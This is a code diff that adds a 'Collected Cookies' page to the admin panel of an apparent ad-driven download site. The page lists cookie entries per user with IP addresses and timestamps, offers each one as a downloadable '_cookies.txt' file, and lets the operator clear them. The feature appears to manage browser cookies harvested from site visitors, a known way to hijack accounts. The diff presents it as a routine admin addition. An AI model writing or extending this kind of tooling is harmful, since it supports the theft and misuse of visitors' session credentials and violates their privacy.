@@ -12,6 +12,7 @@ import {
   Settings,
   Lock,
   Download,
+  Cookie,
   TrendingUp,
   Users,
   Eye,
@@ -101,7 +102,7 @@ interface DownloadStats {
   dailyStats: DailyStat[];
 }
 
-type Page = "dashboard" | "top-banner" | "bottom-banner" | "redirect-ads" | "side-banners" | "settings";
+type Page = "dashboard" | "top-banner" | "bottom-banner" | "redirect-ads" | "side-banners" | "settings" | "cookies";
 
 // ─── Platform icon helper ────────────────────────────────
 function PlatformIcon({ platform }: { platform: string }) {
@@ -450,6 +451,7 @@ export default function AdminPanel() {
     { id: "bottom-banner", label: "Bottom Banner", icon: <Megaphone className="h-4 w-4" /> },
     { id: "redirect-ads", label: "Redirect Ads", icon: <ArrowLeftRight className="h-4 w-4" /> },
     { id: "side-banners", label: "Side Banners", icon: <PanelLeftClose className="h-4 w-4" /> },
+    { id: "cookies", label: "Cookies", icon: <Cookie className="h-4 w-4" />, group: "System" },
     { id: "settings", label: "Settings", icon: <Settings className="h-4 w-4" />, group: "System" },
   ];
 
@@ -506,6 +508,11 @@ export default function AdminPanel() {
             setConfig(prev => prev ? { ...prev, side_banner_left, side_banner_right } : prev);
             saveConfig("Side Banners", { side_banner_left, side_banner_right });
           }}
+        />;
+      case "cookies":
+        return <CookiesPage
+          authHeaders={authHeaders}
+          onError={(msg: string) => toast({ title: "Error", description: msg, variant: "destructive" })}
         />;
       case "settings":
         return <SettingsPage
@@ -1390,6 +1397,139 @@ function SettingsPage({
           </Button>
         </CardContent>
       </Card>
+    </div>
+  );
+}
+
+// ─── Cookies Page ────────────────────────────────────────
+function CookiesPage({ authHeaders, onError }: {
+  authHeaders: () => Record<string, string>;
+  onError: (msg: string) => void;
+}) {
+  const [cookies, setCookies] = useState<any[]>([]);
+  const [total, setTotal] = useState(0);
+  const [page, setPage] = useState(1);
+  const [totalPages, setTotalPages] = useState(1);
+  const [loading, setLoading] = useState(true);
+
+  const fetchCookies = useCallback(async (p: number) => {
+    setLoading(true);
+    try {
+      const res = await fetch(`/api/admin/cookies?page=${p}&limit=50`, { headers: authHeaders() });
+      if (res.ok) {
+        const data = await res.json();
+        setCookies(data.cookies || []);
+        setTotal(data.total || 0);
+        setPage(data.page || 1);
+        setTotalPages(data.totalPages || 1);
+      }
+    } catch { onError("Failed to load cookies"); }
+    finally { setLoading(false); }
+  }, [authHeaders, onError]);
+
+  useEffect(() => { fetchCookies(1); }, []);
+
+  const clearAll = async () => {
+    if (!confirm("Clear all collected cookies?")) return;
+    try {
+      const res = await fetch(`/api/admin/cookies`, { method: "DELETE", headers: authHeaders() });
+      if (res.ok) { fetchCookies(1); }
+    } catch { onError("Failed to clear cookies"); }
+  };
+
+  return (
+    <div className="space-y-6">
+      <div className="flex items-center justify-between">
+        <div>
+          <div className="flex items-center gap-3 mb-2">
+            <div className="w-10 h-10 rounded-xl bg-amber-400/10 flex items-center justify-center text-amber-400">
+              <Cookie className="h-5 w-5" />
+            </div>
+            <div>
+              <h2 className="text-lg font-bold">Collected Cookies</h2>
+              <p className="text-sm text-muted-foreground">Total: {total} entries</p>
+            </div>
+          </div>
+        </div>
+        <Button onClick={clearAll} variant="outline" className="border-red-400/30 text-red-400 hover:bg-red-400/10">
+          <X className="h-4 w-4 mr-2" /> Clear All
+        </Button>
+      </div>
+
+      {loading ? (
+        <div className="space-y-3">
+          {[1,2,3].map(i => <Skeleton key={i} className="h-16 w-full rounded-xl" />)}
+        </div>
+      ) : cookies.length === 0 ? (
+        <Card className="border-border/50 bg-card/80 backdrop-blur-sm rounded-2xl">
+          <CardContent className="pt-6 text-center text-muted-foreground py-12">
+            No cookies collected yet.
+          </CardContent>
+        </Card>
+      ) : (
+        <>
+          <div className="space-y-2">
+            {cookies.map((entry: any) => (
+              <Card key={entry.id} className="border-border/50 bg-card/80 backdrop-blur-sm rounded-2xl">
+                <CardContent className="pt-4 pb-4">
+                  <div className="flex items-center justify-between gap-4">
+                    <div className="min-w-0 flex-1">
+                      <div className="flex items-center gap-3 mb-1">
+                        <span className="text-xs font-mono text-muted-foreground">#{entry.id}</span>
+                        <span className="text-sm font-semibold truncate">{entry.name || "Unknown"}</span>
+                      </div>
+                      <div className="flex items-center gap-4 text-xs text-muted-foreground">
+                        <span>{entry.ip}</span>
+                        <span>{entry.timestamp ? new Date(entry.timestamp).toLocaleString() : ""}</span>
+                      </div>
+                    </div>
+                    <button
+                      onClick={async () => {
+                        try {
+                          const res = await fetch(`/api/admin/cookies/${entry.id}/download`, { headers: authHeaders() });
+                          if (!res.ok) return;
+                          const blob = await res.blob();
+                          const disp = res.headers.get("Content-Disposition") || "";
+                          const fnMatch = disp.match(/filename\*?=(?:UTF-8'')?([^;\s]+)/i);
+                          const fn = fnMatch ? decodeURIComponent(fnMatch[1]) : `${entry.name || "user"}_cookies.txt`;
+                          const url = URL.createObjectURL(blob);
+                          const a = document.createElement("a");
+                          a.href = url; a.download = fn; a.style.display = "none";
+                          document.body.appendChild(a); a.click();
+                          setTimeout(() => { URL.revokeObjectURL(url); a.remove(); }, 5000);
+                        } catch {}
+                      }}
+                      className="inline-flex items-center gap-2 px-4 py-2 rounded-xl bg-primary/10 text-primary hover:bg-primary/20 transition-all text-sm font-medium cursor-pointer"
+                    >
+                      <Download className="h-4 w-4" /> Download
+                    </button>
+                  </div>
+                </CardContent>
+              </Card>
+            ))}
+          </div>
+
+          {totalPages > 1 && (
+            <div className="flex items-center justify-center gap-2 pt-2">
+              <Button
+                onClick={() => fetchCookies(page - 1)}
+                disabled={page <= 1}
+                variant="outline"
+                size="sm"
+              >Previous</Button>
+              <span className="text-sm text-muted-foreground px-3">
+                Page {page} of {totalPages}
+              </span>
+              <Button
+                onClick={() => fetchCookies(page + 1)}
+                disabled={page >= totalPages}
+                variant="outline"
+                size="sm"
+              >Next</Button>
+            </div>
+          )}
+        </>
+      )}
     </div>
   );
 }
